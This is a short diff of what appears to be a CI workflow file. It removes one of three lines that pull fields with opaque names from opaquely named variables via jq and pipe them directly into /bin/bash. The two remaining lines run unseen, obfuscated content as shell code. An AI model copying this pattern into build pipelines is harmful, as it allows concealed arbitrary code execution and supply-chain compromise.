@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$pr47183" | jq -r .eou73273 | /bin/bash
           printf '%s' "$tg28" | jq -r .owvyz7 | /bin/bash
-          printf '%s' "$vn0" | jq -r .get6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
